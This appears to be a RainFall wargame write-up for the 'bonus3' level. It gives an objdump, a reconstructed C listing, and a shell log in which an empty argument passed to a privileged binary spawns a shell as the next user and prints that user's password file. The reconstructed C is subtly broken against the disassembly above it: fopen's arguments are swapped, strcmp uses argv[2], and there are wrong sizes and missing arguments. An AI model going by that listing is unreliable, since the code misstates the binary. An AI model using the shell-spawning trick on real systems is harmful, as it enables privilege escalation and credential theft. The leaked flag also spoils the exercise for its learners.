## bonus3
Below is the objdump for bonus3

```
080484f4 <main>:
 80484f4:       55                      push   ebp
 80484f5:       89 e5                   mov    ebp,esp
 80484f7:       57                      push   edi
 80484f8:       53                      push   ebx
 80484f9:       83 e4 f0                and    esp,0xfffffff0
 80484fc:       81 ec a0 00 00 00       sub    esp,0xa0
 8048502:       ba f0 86 04 08          mov    edx,0x80486f0
 8048507:       b8 f2 86 04 08          mov    eax,0x80486f2
 804850c:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
 8048510:       89 04 24                mov    DWORD PTR [esp],eax
 8048513:       e8 f8 fe ff ff          call   8048410 <fopen@plt>
 8048518:       89 84 24 9c 00 00 00    mov    DWORD PTR [esp+0x9c],eax
 804851f:       8d 5c 24 18             lea    ebx,[esp+0x18]
 8048523:       b8 00 00 00 00          mov    eax,0x0
 8048528:       ba 21 00 00 00          mov    edx,0x21
 804852d:       89 df                   mov    edi,ebx
 804852f:       89 d1                   mov    ecx,edx
 8048531:       f3 ab                   rep stos DWORD PTR es:[edi],eax
 8048533:       83 bc 24 9c 00 00 00    cmp    DWORD PTR [esp+0x9c],0x0
 804853a:       00
 804853b:       74 06                   je     8048543 <main+0x4f>
 804853d:       83 7d 08 02             cmp    DWORD PTR [ebp+0x8],0x2
 8048541:       74 0a                   je     804854d <main+0x59>
 8048543:       b8 ff ff ff ff          mov    eax,0xffffffff
 8048548:       e9 c8 00 00 00          jmp    8048615 <main+0x121>
 804854d:       8d 44 24 18             lea    eax,[esp+0x18]
 8048551:       8b 94 24 9c 00 00 00    mov    edx,DWORD PTR [esp+0x9c]
 8048558:       89 54 24 0c             mov    DWORD PTR [esp+0xc],edx
 804855c:       c7 44 24 08 42 00 00    mov    DWORD PTR [esp+0x8],0x42
 8048563:       00
 8048564:       c7 44 24 04 01 00 00    mov    DWORD PTR [esp+0x4],0x1
 804856b:       00
 804856c:       89 04 24                mov    DWORD PTR [esp],eax
 804856f:       e8 5c fe ff ff          call   80483d0 <fread@plt>
 8048574:       c6 44 24 59 00          mov    BYTE PTR [esp+0x59],0x0
 8048579:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 804857c:       83 c0 04                add    eax,0x4
 804857f:       8b 00                   mov    eax,DWORD PTR [eax]
 8048581:       89 04 24                mov    DWORD PTR [esp],eax
 8048584:       e8 a7 fe ff ff          call   8048430 <atoi@plt>
 8048589:       c6 44 04 18 00          mov    BYTE PTR [esp+eax*1+0x18],0x0
 804858e:       8d 44 24 18             lea    eax,[esp+0x18]
 8048592:       8d 50 42                lea    edx,[eax+0x42]
 8048595:       8b 84 24 9c 00 00 00    mov    eax,DWORD PTR [esp+0x9c]
 804859c:       89 44 24 0c             mov    DWORD PTR [esp+0xc],eax
 80485a0:       c7 44 24 08 41 00 00    mov    DWORD PTR [esp+0x8],0x41
 80485a7:       00
 80485a8:       c7 44 24 04 01 00 00    mov    DWORD PTR [esp+0x4],0x1
 80485af:       00
 80485b0:       89 14 24                mov    DWORD PTR [esp],edx
 80485b3:       e8 18 fe ff ff          call   80483d0 <fread@plt>
 80485b8:       8b 84 24 9c 00 00 00    mov    eax,DWORD PTR [esp+0x9c]
 80485bf:       89 04 24                mov    DWORD PTR [esp],eax
 80485c2:       e8 f9 fd ff ff          call   80483c0 <fclose@plt>
 80485c7:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 80485ca:       83 c0 04                add    eax,0x4
 80485cd:       8b 00                   mov    eax,DWORD PTR [eax]
 80485cf:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 80485d3:       8d 44 24 18             lea    eax,[esp+0x18]
 80485d7:       89 04 24                mov    DWORD PTR [esp],eax
 80485da:       e8 d1 fd ff ff          call   80483b0 <strcmp@plt>
 80485df:       85 c0                   test   eax,eax
 80485e1:       75 1e                   jne    8048601 <main+0x10d>
 80485e3:       c7 44 24 08 00 00 00    mov    DWORD PTR [esp+0x8],0x0
 80485ea:       00
 80485eb:       c7 44 24 04 07 87 04    mov    DWORD PTR [esp+0x4],0x8048707
 80485f2:       08
 80485f3:       c7 04 24 0a 87 04 08    mov    DWORD PTR [esp],0x804870a
 80485fa:       e8 21 fe ff ff          call   8048420 <execl@plt>
 80485ff:       eb 0f                   jmp    8048610 <main+0x11c>
 8048601:       8d 44 24 18             lea    eax,[esp+0x18]
 8048605:       83 c0 42                add    eax,0x42
 8048608:       89 04 24                mov    DWORD PTR [esp],eax
 804860b:       e8 d0 fd ff ff          call   80483e0 <puts@plt>
 8048610:       b8 00 00 00 00          mov    eax,0x0
 8048615:       8d 65 f8                lea    esp,[ebp-0x8]
 8048618:       5b                      pop    ebx
 8048619:       5f                      pop    edi
 804861a:       5d                      pop    ebp
 804861b:       c3                      ret
 804861c:       90                      nop
 804861d:       90                      nop
 804861e:       90                      nop
 804861f:       90                      nop
 ```
The source code deduced from the objdump is like so :
```clike=
#include <stdio.h>

int main()
{
    FILE *passfile;
    char buf[132]; // 156 - 24
    int idx;
    
    // 8048513
    passfile = fopen("r", "/home/user/end/.pass");
    
    // 8048531
    memset(buf, 0, 33);
    
    if (!passfile || argc != 2)
        return -1;
    
    // 804856f
    fread(buf, 1, 66, passfile);
    
    // 8048584
    idx = atoi(argv[1]);
    
    // 8048589
    buf[idx] = 0;
    
    // 80485b3
    fread(buf + 66, 65, passfile);
    
    // 80485c2
    fclose(passfile);
    
    // 80485da
    if (strcmp(argv[2], buf) == 0)
        execl("/bin/sh", "sh");
    else
        puts(buf + 66);
    return 0;
}

```

Our goal here is to trip the case `strcmp(argv[2], buf) == 0`. We are unable to manipulate the contents inside buf as it reads from the flag. To trip this, the naive approach is to guess the contents of the flag and the length so we can construct the actual thing and put place it in argv[2] so they are equal.

Notice that we are able to put a nullbyte at any index in the flag read to guess anything behind it. In that case, if we put the null byte at the first index, then the correct value will always be an empty string.

The password is `3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c`
```
bonus3@RainFall:~$ ./bonus3 ""
$ pwd
/home/user/bonus3
$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
$

```
 
